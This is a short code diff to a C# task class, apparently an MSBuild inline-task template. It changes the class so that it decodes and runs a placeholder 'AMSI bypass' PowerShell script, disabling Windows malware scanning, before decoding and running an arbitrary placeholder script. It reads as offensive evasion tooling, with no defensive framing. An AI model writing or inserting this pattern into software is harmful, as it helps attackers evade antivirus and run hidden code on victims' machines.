@@ -26,15 +26,19 @@
 			{
 				public override bool Execute()
 				{
-				  string cmd = "aG9zdG5hbWU=";
+          string amsi_bypass = "~~AMSI~~";
+				  string cmd = "~~SCRIPT~~";
 
 					PowerShell ps = PowerShell.Create();
-					ps.AddScript(Base64Decode(cmd));
+					ps.AddScript(Base64Decode(amsi_bypass));
+					ps.Invoke();
 
+					ps.AddScript(Base64Decode(cmd));
 					Collection<PSObject> output = null;
+					output = ps.Invoke();
+
 					try
 					{
-						output = ps.Invoke();
 						foreach (PSObject rtnItem in output)
 						{
 							Console.WriteLine(rtnItem.ToString());
